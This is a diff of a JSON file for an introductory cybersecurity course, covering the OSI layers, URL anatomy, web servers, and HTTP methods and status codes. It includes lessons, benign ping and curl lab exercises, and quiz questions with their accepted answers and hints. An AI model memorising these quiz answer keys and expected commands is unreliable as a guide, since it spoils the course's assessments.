+    "diagramSvg": "<svg viewBox=\"0 0 600 230\" width=\"100%\" height=\"230\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <g transform=\"translate(50, 15)\">\n    <rect x=\"0\" y=\"0\" width=\"500\" height=\"24\" rx=\"4\" fill=\"#38bdf8\"/><text x=\"250\" y=\"16\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">7. Application (HTTP, DNS, SSH, FTP)</text>\n    <rect x=\"0\" y=\"28\" width=\"500\" height=\"24\" rx=\"4\" fill=\"#0ea5e9\"/><text x=\"250\" y=\"44\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">6. Presentation (SSL/TLS, ASCII, Encryption)</text>\n    <rect x=\"0\" y=\"56\" width=\"500\" height=\"24\" rx=\"4\" fill=\"#0284c7\"/><text x=\"250\" y=\"72\" fill=\"#ffffff\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">5. Session (Sockets, Connection State)</text>\n    <rect x=\"0\" y=\"84\" width=\"500\" height=\"24\" rx=\"4\" fill=\"#10b981\"/><text x=\"250\" y=\"100\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">4. Transport (TCP, UDP, Ports)</text>\n    <rect x=\"0\" y=\"112\" width=\"500\" height=\"24\" rx=\"4\" fill=\"#059669\"/><text x=\"250\" y=\"128\" fill=\"#ffffff\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">3. Network (IP Addressing, Routers, Packets)</text>\n    <rect x=\"0\" y=\"140\" width=\"500\" height=\"24\" rx=\"4\" fill=\"#f59e0b\"/><text x=\"250\" y=\"156\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">2. Data Link (MAC, Switches, Ethernet Frames)</text>\n    <rect x=\"0\" y=\"168\" width=\"500\" height=\"24\" rx=\"4\" fill=\"#ef4444\"/><text x=\"250\" y=\"184\" fill=\"#ffffff\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">1. Physical (Cables, Radio Waves, Bits)</text>\n  </g>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. The 7 Layers of the OSI Model",
+        "content": "Memorize this classic mnemonic: **P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way!\n\n\u2022 **Layer 7 - Application**: Human-computer interaction (HTTP, DNS, SSH, FTP).\n\u2022 **Layer 6 - Presentation**: Data formatting, character encoding, SSL/TLS encryption.\n\u2022 **Layer 5 - Session**: Manages dialogues and persistent connections between devices.\n\u2022 **Layer 4 - Transport**: End-to-end transport, port numbers, reliability (TCP, UDP). **PDU: Segment**.\n\u2022 **Layer 3 - Network**: Logical IP addressing and routing between networks. **PDU: Packet**.\n\u2022 **Layer 2 - Data Link**: Physical MAC addressing and switching on local network. **PDU: Frame**.\n\u2022 **Layer 1 - Physical**: Raw transmission of electrical, optical, or radio binary pulses. **PDU: Bits**."
+      },
+      {
+        "title": "2. Data Encapsulation: The Envelopes Within Envelopes",
+        "content": "When you send a message, it is encapsulated like nesting Russian dolls:\n\n1. At Layer 7, you type an HTTP request (`Data`).\n2. At Layer 4, the kernel adds a **TCP header** with source & dest ports -> **Segment**.\n3. At Layer 3, the kernel adds an **IP header** with source & dest IP addresses -> **Packet**.\n4. At Layer 2, the network card adds an **Ethernet header** with source & dest MACs -> **Frame**.\n5. At Layer 1, the physical NIC pulses the frame as electrical 1s and 0s onto the wire -> **Bits**!\n\nWhen the server receives the bits, it does **Decapsulation**\u2014stripping off the layers one by one until only the pure HTTP data remains."
+      },
+      {
+        "title": "3. Troubleshooting Down the Stack",
+        "content": "When a network fails, troubleshoot from Layer 1 up to Layer 7:\n\n\u2022 **Layer 1 (Physical)**: Is the Ethernet cable plugged in? Is Wi-Fi turned on?\n\u2022 **Layer 3 (Network)**: Can you reach your default gateway? Run `ping 192.168.1.1`.\n\u2022 **Layer 3 (Internet Routing)**: Can you reach Google's IP? Run `ping 8.8.8.8`.\n\u2022 **Layer 7 (DNS)**: Can you resolve names? Run `nslookup google.com`."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Testing Network Reachability with ping",
+        "codeOrDiagram": "cadet@endlessus:~$ ping -c 3 1.1.1.1\nPING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.\n64 bytes from 1.1.1.1: icmp_seq=1 ttl=58 time=12.4 ms\n64 bytes from 1.1.1.1: icmp_seq=2 ttl=58 time=11.8 ms\n64 bytes from 1.1.1.1: icmp_seq=3 ttl=58 time=12.1 ms\n\n--- 1.1.1.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss",
+        "explanation": "`ping -c 3` transmits 3 ICMP echo request packets, proving Layer 3 connectivity with zero packet loss."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `ping -c 2 10.10.20.15` in the terminal to test Layer 3 ICMP reachability to the target server:",
+      "initialCommand": "",
+      "expectedCommand": "ping -c 2 10.10.20.15",
+      "simulatedOutput": "PING 10.10.20.15 (10.10.20.15) 56(84) bytes of data.\n64 bytes from 10.10.20.15: icmp_seq=1 ttl=64 time=0.452 ms\n64 bytes from 10.10.20.15: icmp_seq=2 ttl=64 time=0.380 ms\n--- 10.10.20.15 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss",
+      "explanation": "`ping` verifies network path reachability via ICMP."
+    },
+    "questions": [
+      {
+        "id": "q-28-1",
+        "type": "exact",
+        "question": "What is the specific Protocol Data Unit (PDU) name used at Layer 3 (Network Layer) of the OSI model?",
+        "visualSlots": "_ _ _ _ _ _",
+        "acceptedAnswers": [
+          "packet",
+          "packets"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Six letters: p-a-c-k-e-t.",
+        "explanation": "At Layer 3 (Network), the Protocol Data Unit is called a Packet."
+      },
+      {
+        "id": "q-28-2",
+        "type": "multiple-choice",
+        "question": "At which layer of the OSI 7-Layer model do switches operate using physical MAC addresses?",
+        "options": [
+          "Layer 1 (Physical)",
+          "Layer 2 (Data Link)",
+          "Layer 3 (Network)",
+          "Layer 4 (Transport)"
+        ],
+        "correctIndex": 1,
+        "hint": "Data Link Layer.",
+        "explanation": "Layer 2 (Data Link) handles physical framing and MAC addressing."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Test network connectivity with ping",
+        "instruction": "Execute `ping -c 2 10.10.20.15` in the terminal.",
+        "hints": [
+          "Type: `ping -c 2 10.10.20.15`"
+        ]
+      }
+    ],
+    "securityConnection": "Security controls map directly to OSI layers: Physical access control operates at Layer 1; 802.1X port security operates at Layer 2; Network firewalls filter at Layer 3/4; Web Application Firewalls (WAFs) like ModSecurity operate at Layer 7 by inspecting application HTTP payloads.",
+    "id": "room-28",
+    "nextRoomId": "room-29"
+  },
+  {
+    "stage": 5,
+    "level": 5,
+    "levelTitle": "Level 5 \u2014 Internet & Web Fundamentals",
+    "title": "How the World Wide Web Works",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Level 4: Networking Fundamentals",
+    "whyAreYouHere": "Web applications are the most attacked surface in modern cybersecurity. From online banking and social media to cloud infrastructure portals, almost everything runs through web browsers. In this room, you will learn how the World Wide Web functions, examine the anatomy of a URL, and understand web servers like Nginx and Apache.",
+    "objectives": [
+      "Understand the web's foundational technologies: URLs, HTTP, HTML, and Web Servers",
+      "Deconstruct the anatomy of a Uniform Resource Locator (URL): scheme, host, port, path, and query parameters",
+      "Learn the role of web server daemons (Nginx, Apache HTTP Server, Microsoft IIS)",
+      "Understand web document roots (e.g. `/var/www/html/`) and virtual hosting",
+      "Query web pages from the terminal using `curl`"
     ],
     "vocabulary": [
       {
         "term": "URL (Uniform Resource Locator)",
-        "definition": "The complete web address used to locate a specific resource on the internet (e.g., `https://endlessus.in/learning.html?theme=normal`)."
+        "definition": "A standardized reference address specifying the location and access protocol of a resource on the web."
       },
       {
-        "term": "TLS / SSL",
-        "definition": "Transport Layer Security: the cryptographic protocol that provides privacy and data integrity between two communicating computer applications."
+        "term": "Web Server",
+        "definition": "Software (such as Nginx or Apache) that listens on ports 80/443, processes HTTP requests, and returns HTML, CSS, images, or JSON data."
       },
       {
-        "term": "HTTPS (Port 443)",
-        "definition": "HTTP layered over an encrypted TLS connection, preventing eavesdropping and tampering by network adversaries."
+        "term": "Document Root",
+        "definition": "The filesystem directory on a server where website files are stored (typically /var/www/html on Linux)."
       },
       {
-        "term": "CDN (Content Delivery Network)",
-        "definition": "A geographically distributed network of proxy servers that cache content close to end users for high speed."
+        "term": "Query String",
+        "definition": "The portion of a URL following '?' containing key-value parameters passed to the server (e.g. ?search=cybersecurity&page=1)."
       },
       {
-        "term": "Reverse Proxy",
-        "definition": "A server (like Nginx or Cloudflare) positioned in front of web servers to handle TLS, caching, and load balancing."
+        "term": "curl",
+        "definition": "A command-line tool used to transfer data to or from a network server using protocols like HTTP, HTTPS, and FTP."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <rect x=\"30\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"105\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Web Browser</text>\n  <text x=\"105\" y=\"95\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">(Client)</text>\n\n  <!-- Request -->\n  <line x1=\"180\" y1=\"60\" x2=\"420\" y2=\"60\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"420,60 410,55 410,65\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"52\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">GET /login.html HTTP/1.1</text>\n\n  <!-- Response -->\n  <line x1=\"420\" y1=\"100\" x2=\"180\" y2=\"100\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"180,100 190,95 190,105\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"118\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">HTTP/1.1 200 OK (HTML Payload)</text>\n\n  <rect x=\"420\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"495\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Nginx Server</text>\n  <text x=\"495\" y=\"95\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Port 80 / 443</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The 8-Step Web Request Odyssey",
-        "content": "What happens when you hit Enter on `https://endlessus.in`:\n1. **URL Parsing**: Browser separates Scheme (`https`), Host (`endlessus.in`), Port (`443`), and Path (`/`).\n2. **DNS Resolution**: Browser queries cache -> resolver -> authoritative server to discover destination IP (`185.199.108.153`).\n3. **TCP 3-Way Handshake**: Client and server exchange SYN -> SYN-ACK -> ACK on port 443.\n4. **TLS Key Exchange**: Client and server exchange cryptographic certificates, verify server identity, and negotiate an AES session key.\n5. **HTTP Request**: Browser transmits `GET / HTTP/2` encrypted inside TLS.\n6. **Server Processing**: Web server / reverse proxy routes request to application backend.\n7. **HTTP Response**: Server transmits status `200 OK` with HTML content.\n8. **Browser Rendering**: Browser parses HTML, constructs DOM, downloads CSS/JS, and paints pixels."
+        "title": "1. Anatomy of a URL",
+        "content": "Every time you click a link, your browser parses a **Uniform Resource Locator (URL)**:\n\n`https://endlessus.in:443/labs/search.php?topic=linux#task2`\n\n\u2022 **Scheme/Protocol (`https://`)**: Defines how to communicate (HTTP vs HTTPS).\n\u2022 **Host / Domain (`endlessus.in`)**: The domain name resolved via DNS to an IP.\n\u2022 **Port (`:443`)**: The target network port (optional; defaults to 80 for HTTP, 443 for HTTPS).\n\u2022 **Path (`/labs/search.php`)**: The file path requested on the web server.\n\u2022 **Query String (`?topic=linux`)**: User-supplied input parameters passed to server backend scripts.\n\u2022 **Fragment (`#task2`)**: Internal anchor for the browser to scroll down to."
+      },
+      {
+        "title": "2. Web Server Daemons: Apache & Nginx",
+        "content": "When a web server receives an incoming HTTP request, software daemons handle the delivery:\n\n\u2022 **Nginx**: Lightweight, event-driven web server famous for high performance and reverse proxying.\n\u2022 **Apache HTTP Server**: The classic workhorse of the web, configured via `.htaccess` files and modules.\n\u2022 **Microsoft IIS**: Enterprise web server running on Windows Server with ASP.NET.\n\nWebsite files live in a **Document Root** (e.g. `/var/www/html/`). If a user requests `GET /about.html`, the web server looks for `/var/www/html/about.html` and streams its bytes back in an HTTP response!"
       }
     ],
     "seeExamples": [
       {
-        "title": "Complete Web Request Flowchart",
-        "codeOrDiagram": "[ Browser: User types URL ]\n            ↓ Step 1 & 2\n[ DNS Resolver: Resolves endlessus.in -> 185.199.108.153 ]\n            ↓ Step 3\n[ TCP Handshake: SYN -> SYN-ACK -> ACK on Port 443 ]\n            ↓ Step 4\n[ TLS Handshake: Certificate verified & Session Keys established ]\n            ↓ Step 5 & 6\n[ Encrypted HTTP GET / transmitted across ISP and Fiber ]\n            ↓ Step 7\n[ Web Server returns 200 OK + HTML payload ]\n            ↓ Step 8\n[ Browser renders DOM & executes JavaScript ]",
-        "explanation": "Every modern website interaction traverses this exact pipeline before you see a single image."
+        "title": "Fetching a Web Page with curl",
+        "codeOrDiagram": "cadet@endlessus:~$ curl -s http://10.10.10.45/index.html | head -n 4\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Acme Finance Portal</title>",
+        "explanation": "`curl -s` fetches the raw HTML page directly over HTTP without a graphical browser."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Inspect the timing phases (DNS, TCP Connect, TLS Handshake, and First Byte) of connecting to `https://endlessus.in` using curl:",
+      "prompt": "Run `curl -s http://10.10.10.45/index.html | head -n 3` in the terminal to inspect the HTML response:",
       "initialCommand": "",
-      "expectedCommand": "curl -w \"DNS: %{time_namelookup}s | Connect: %{time_connect}s | TLS: %{time_appconnect}s | Total: %{time_total}s\\n\" -o /dev/null -s https://endlessus.in",
-      "simulatedOutput": "DNS: 0.012s | Connect: 0.038s | TLS: 0.076s | Total: 0.114s\n[+] Success! Complete request completed in 114ms: DNS (12ms) -> TCP (26ms) -> TLS (38ms) -> Content delivery (38ms).",
-      "explanation": "`curl -w` formats custom diagnostic metrics, allowing security analysts to profile connection latency and SSL handshakes."
+      "expectedCommand": "curl -s http://10.10.10.45/index.html | head -n 3",
+      "simulatedOutput": "<!DOCTYPE html>\n<html>\n<head>\n[+] Web server contacted: HTML document received over HTTP port 80.",
+      "explanation": "`curl` retrieves HTTP resources via the command line."
     },
     "questions": [
       {
-        "id": "r11-q1",
-        "type": "multiple-choice",
-        "question": "During which phase of delivering an HTTPS website are cryptographic certificates validated and symmetric encryption keys negotiated?",
-        "options": [
-          "The DNS Resolution phase",
-          "The TLS Handshake phase",
-          "The ARP Broadcast phase",
-          "The HTML Parsing phase"
+        "id": "q-29-1",
+        "type": "exact",
+        "question": "Which command-line utility is widely used in Linux to transmit data and make HTTP/HTTPS web requests?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "curl"
         ],
-        "correctIndex": 1,
-        "explanation": "The TLS (Transport Layer Security) handshake negotiates ciphers and authenticates the server's public key certificate."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Four letters: c-u-r-l.",
+        "explanation": "`curl` is the standard tool for transferring data with URLs."
       },
       {
-        "id": "r11-q2",
+        "id": "q-29-2",
         "type": "multiple-choice",
-        "question": "If a website uses unencrypted HTTP on port 80 instead of HTTPS on port 443, what can a malicious actor on the same Wi-Fi network see?",
+        "question": "In the URL `http://example.com/search.php?query=security`, what is the component `?query=security` called?",
+        "visualSlots": null,
         "options": [
-          "Only the domain name, but all passwords are automatically masked",
-          "The entire contents of requests and responses, including login passwords, session cookies, and private messages in plain text",
-          "Nothing, because Wi-Fi routers automatically encrypt all web traffic with RSA",
-          "Only the server's CPU temperature"
+          "The Scheme",
+          "The Query String",
+          "The Fragment Identifier",
+          "The TLD"
         ],
         "correctIndex": 1,
-        "explanation": "Unencrypted HTTP sends everything in plain text over the air. Anyone running Wireshark or ARP spoofing can read all cookies and credentials."
+        "hint": "Query parameters passed after question mark.",
+        "explanation": "Parameters after the '?' character form the Query String."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Profile Web Latency Breakdown",
-        "instruction": "Execute the curl timing command to measure the real-world connection phases of `https://endlessus.in`.",
+        "title": "Task 1: Fetch HTML via curl",
+        "instruction": "Execute `curl -s http://10.10.10.45/index.html | head -n 3` in the terminal.",
         "hints": [
-          "Concept: Measure DNS, Connect, TLS, and Total times.",
-          "Direction: Use curl with the `-w` write-out parameter.",
-          "Tool: `curl`",
-          "Syntax: Run the provided timing command.",
-          "Explanation: Demonstrates how fast modern web infrastructure operates."
+          "Type: `curl -s http://10.10.10.45/index.html | head -n 3`"
         ]
       }
     ],
-    "explainResult": "The `curl` command opened a socket, resolved DNS via system getaddrinfo, initiated the TCP 3-way handshake, exchanged TLS client/server hellos, verified the certificate chain, and retrieved the web index.",
-    "securityConnection": "Every step in this delivery chain has a corresponding cyber attack: DNS Cache Poisoning at Step 2, TCP SYN Flooding at Step 3, Man-in-the-Middle SSL Stripping at Step 4, and Web Application Injection at Step 6. Understanding the delivery chain enables you to spot where security controls fail.",
-    "completion": {
-      "learned": [
-        "The 8-step lifecycle of an internet web request",
-        "The difference between HTTP (port 80) and encrypted HTTPS (port 443)",
-        "The role of TLS handshakes in encrypting data in-flight",
-        "How reverse proxies and CDNs protect origin servers"
-      ],
-      "practiced": [
-        "curl timing profiling",
-        "Tracing request sequences from DNS to DOM",
-        "Evaluating unencrypted vs encrypted transport"
-      ]
-    },
-    "nextRoomId": "room-12"
+    "securityConnection": "Attackers probe web query parameters (like `?id=1` or `?search=admin`) for injection vulnerabilities like SQL Injection, Cross-Site Scripting (XSS), and Local File Inclusion (LFI).",
+    "id": "room-29",
+    "nextRoomId": "room-30"
   },
   {
-    "id": "room-12",
-    "stage": 3,
-    "stageTitle": "Stage 3 — How the Web Works",
-    "title": "HTTP Fundamentals: Requests & Responses",
+    "stage": 5,
+    "level": 5,
+    "levelTitle": "Level 5 \u2014 Internet & Web Fundamentals",
+    "title": "HTTP Requests, Methods & Status Codes",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 11 (How the Internet Delivers a Website)",
-    "whyAreYouHere": "Web security testing is impossible without being able to read and construct raw HTTP traffic. Web applications do not operate on magic; they communicate via plain-text messages following the HTTP standard. In this room, you will dissect HTTP request methods (GET, POST, PUT, DELETE), understand status code ranges (200, 302, 403, 404, 500), and inspect request headers.",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 29: How the World Wide Web Works",
+    "whyAreYouHere": "HTTP (Hypertext Transfer Protocol) is a plain-text protocol. Every action you take on the web\u2014submitting a password, viewing a photo, deleting an account\u2014is an HTTP Request containing a **Method** (verb) that receives an HTTP **Status Code** (number). In this room, you will learn the primary HTTP methods and understand the 5 families of HTTP status codes.",
     "objectives": [
-      "Understand the stateless nature of the Hypertext Transfer Protocol (HTTP)",
-      "Dissect an HTTP Request: Method, Path, Version, Headers, and Body",
-      "Master HTTP Methods: GET (retrieve), POST (submit), PUT (replace), DELETE (remove)",
-      "Learn HTTP Response Status Code classes: 2xx (Success), 3xx (Redirect), 4xx (Client Error), 5xx (Server Error)",
-      "Send and analyze raw HTTP requests using curl and netcat"
+      "Understand the structure of a raw HTTP request and HTTP response",
+      "Learn primary HTTP Methods: GET, POST, PUT, DELETE, and HEAD",
+      "Differentiate between safe/idempotent GET and state-changing POST",
+      "Master the 5 HTTP Status Code families: 1xx, 2xx, 3xx, 4xx, and 5xx",
+      "Inspect response headers and status codes using `curl -I`"
     ],
     "vocabulary": [
       {
-        "term": "HTTP (Hypertext Transfer Protocol)",
-        "definition": "The application-level protocol used for transmitting hypermedia documents across the World Wide Web."
+        "term": "HTTP Method (Verb)",
+        "definition": "The action specified in an HTTP request indicating what operation should be performed on the target resource."
       },
       {
-        "term": "GET Method",
-        "definition": "An HTTP method used to request data from a specified resource without altering server state."
+        "term": "GET",
+        "definition": "The HTTP method used strictly to retrieve data without modifying server state."
       },
       {
-        "term": "POST Method",
-        "definition": "An HTTP method used to send data (such as login credentials or form inputs) to the server to create or update a resource."
+        "term": "POST",
+        "definition": "The HTTP method used to send data (passwords, form inputs, uploaded files) to the server to create or update resources."
       },
       {
         "term": "Status Code",
-        "definition": "A 3-digit number returned by the server indicating the result of the client's request (e.g. 200 OK, 404 Not Found)."
+        "definition": "A 3-digit number returned by a server indicating the outcome of the requested HTTP operation."
       },
       {
-        "term": "HTTP Headers",
-        "definition": "Colon-separated key-value pairs (e.g. `User-Agent`, `Content-Type`) providing metadata about the request or response."
-      },
-      {
-        "term": "HTTP Body",
-        "definition": "The optional data payload sent after the headers, containing form parameters, JSON data, or file uploads."
+        "term": "404 Not Found",
+        "definition": "Client error status code indicating the requested URL path does not exist on the server."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <rect x=\"30\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"105\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Web Browser</text>\n  <text x=\"105\" y=\"95\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">(Client)</text>\n\n  <!-- Request -->\n  <line x1=\"180\" y1=\"60\" x2=\"420\" y2=\"60\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"420,60 410,55 410,65\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"52\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">GET /login.html HTTP/1.1</text>\n\n  <!-- Response -->\n  <line x1=\"420\" y1=\"100\" x2=\"180\" y2=\"100\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"180,100 190,95 190,105\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"118\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">HTTP/1.1 200 OK (HTML Payload)</text>\n\n  <rect x=\"420\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"495\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Nginx Server</text>\n  <text x=\"495\" y=\"95\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Port 80 / 443</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Anatomy of an HTTP Request",
-        "content": "A raw HTTP request looks like this plain text:\n```http\nPOST /login HTTP/1.1\nHost: endlessus.in\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\n\nusername=cadet&password=Secret123\n```\n• Line 1: **Request Line** — Method (`POST`), Path (`/login`), Protocol (`HTTP/1.1`).\n• Lines 2-5: **Headers** — Metadata specifying host, client type, and format.\n• Line 6: **Blank Line** (`\\r\\n\\r\\n`) — Separates headers from body.\n• Line 7: **Message Body** — The actual data sent to the server."
+        "title": "1. Primary HTTP Methods (Verbs)",
+        "content": "\u2022 **`GET`**: Retrieve a resource. Parameters are sent visibly inside the URL query string. GET should never change server state!\n\u2022 **`POST`**: Submit data to be processed (e.g. login forms, credit card forms). Data is transmitted inside the HTTP request body.\n\u2022 **`PUT`**: Replace an existing resource or upload a file.\n\u2022 **`DELETE`**: Delete the specified resource on the server.\n\u2022 **`HEAD`**: Same as GET, but asks the server to return ONLY the response headers, omitting the body (used by `curl -I` to audit security headers!)."
       },
       {
-        "title": "2. Decoding HTTP Status Codes",
-        "content": "Status codes tell you what happened immediately:\n• **2xx (Success)**: `200 OK` (Resource found and served), `201 Created` (New item added).\n• **3xx (Redirection)**: `301 Moved Permanently`, `302 Found / Temporary Redirect` (Go to this other URL).\n• **4xx (Client Error)**: `400 Bad Request` (Malformed syntax), `401 Unauthorized` (Login required), `403 Forbidden` (Permission denied), `404 Not Found` (Resource does not exist).\n• **5xx (Server Error)**: `500 Internal Server Error` (Backend code crashed), `502 Bad Gateway` (Upstream proxy failed)."
+        "title": "2. The 5 Families of HTTP Status Codes",
+        "content": "Status codes are 3-digit numbers grouped by their first digit:\n\n\u2022 **`1xx Informational`**: Request received, protocol switching (e.g. `101 Switching Protocols` for WebSockets).\n\u2022 **`2xx Success`**: Everything worked perfectly!\n  - `200 OK`: Standard successful response.\n  - `201 Created`: Resource successfully created (common in REST APIs).\n\u2022 **`3xx Redirection`**: Further action needed; browser redirected.\n  - `301 Moved Permanently`: URL has permanently changed.\n  - `302 Found (Temporary Redirect)`: Temporarily redirected (e.g. redirecting to `/login` if not authenticated).\n\u2022 **`4xx Client Error`**: The browser sent a bad or unauthorized request!\n  - `400 Bad Request`: Malformed syntax.\n  - `401 Unauthorized`: Authentication required (missing login credentials).\n  - `403 Forbidden`: Authenticated, but you lack permission to view this resource!\n  - `404 Not Found`: File or endpoint does not exist.\n\u2022 **`5xx Server Error`**: The server crashed or encountered an unhandled exception!\n  - `500 Internal Server Error`: Web application bug or database crash (Goldmine for pentesting!).\n  - `502 Bad Gateway`: Upstream backend server unreachable."
       }
     ],
     "seeExamples": [
       {
-        "title": "Anatomy of an HTTP Response",
-        "codeOrDiagram": "HTTP/1.1 200 OK\nDate: Sun, 05 Oct 2026 16:35:00 GMT\nServer: Apache/2.4.52 (Ubuntu)\nContent-Type: text/html; charset=UTF-8\nContent-Length: 142\n\n<!DOCTYPE html>\n<html>\n  <head><title>Dashboard</title></head>\n  <body><h1>Welcome Cadet</h1></body>\n</html>",
-        "explanation": "Status line, response headers (metadata), a mandatory blank line, followed by the HTML body."
+        "title": "Inspecting Status Codes with curl -I",
+        "codeOrDiagram": "cadet@endlessus:~$ curl -I http://10.10.10.45/login\nHTTP/1.1 200 OK\nServer: nginx/1.24.0\nDate: Sun, 15 Oct 2026 12:00:00 GMT\nContent-Type: text/html; charset=UTF-8",
+        "explanation": "`curl -I` issues an HTTP HEAD request, returning the status line (`HTTP/1.1 200 OK`) and response headers."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Send a raw HTTP GET request to our lab web server and inspect the status line and headers using `curl -v http://localhost:8080/api/status`:",
+      "prompt": "Run `curl -I http://10.10.10.45/login` to inspect the HTTP response status code and headers:",
       "initialCommand": "",
-      "expectedCommand": "curl -v http://localhost:8080/api/status",
-      "simulatedOutput": "> GET /api/status HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/8.5.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Content-Length: 32\n<\n{\"status\":\"operational\",\"auth\":false}\n[+] Success! You inspected both outgoing request headers (>) and incoming response headers (<).",
-      "explanation": "`curl -v` (verbose) displays the exact HTTP dialogue: lines starting with `>` are what you sent; lines with `<` are what the server returned."
+      "expectedCommand": "curl -I http://10.10.10.45/login",
+      "simulatedOutput": "HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: text/html; charset=UTF-8\n[+] Status code verified: HTTP 200 OK received.",
+      "explanation": "`curl -I` queries only the response headers."
     },
     "questions": [
       {
-        "id": "r12-q1",
-        "type": "multiple-choice",
-        "question": "Which HTTP status code indicates that the requested file or endpoint could not be found on the server?",
-        "options": [
-          "200 OK",
-          "302 Found",
-          "404 Not Found",
-          "500 Internal Server Error"
+        "id": "q-30-1",
+        "type": "exact",
+        "question": "What 3-digit HTTP status code indicates that the requested web page was successfully found and returned (OK)?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "200"
         ],
-        "correctIndex": 2,
-        "explanation": "`404 Not Found` is the standard status code indicating the server cannot locate the requested URI."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Three digits: 200.",
+        "explanation": "200 OK is the standard success status code."
       },
       {
-        "id": "r12-q2",
-        "type": "multiple-choice",
-        "question": "What character sequence is required in raw HTTP to separate the headers from the body payload?",
-        "options": [
-          "An empty blank line (Carriage Return + Line Feed: `\\r\\n\\r\\n`)",
-          "Three semicolons `;;;`",
-          "An XML tag `<end-headers>`",
-          "A null byte `\\x00`"
+        "id": "q-30-2",
+        "type": "exact",
+        "question": "Which HTTP status code represents 'Forbidden', meaning the server understands the request but refuses to authorize access?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "403"
         ],
-        "correctIndex": 0,
-        "explanation": "RFC 7230 strictly mandates a double CRLF (an empty blank line) to signal the end of HTTP headers."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Four-zero-three.",
+        "explanation": "403 Forbidden indicates access to the resource is blocked."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Analyze Verbose HTTP Headers",
-        "instruction": "Run `curl -v http://localhost:8080/api/status` to view the request and response handshake.",
+        "title": "Task 1: Query HTTP headers with curl -I",
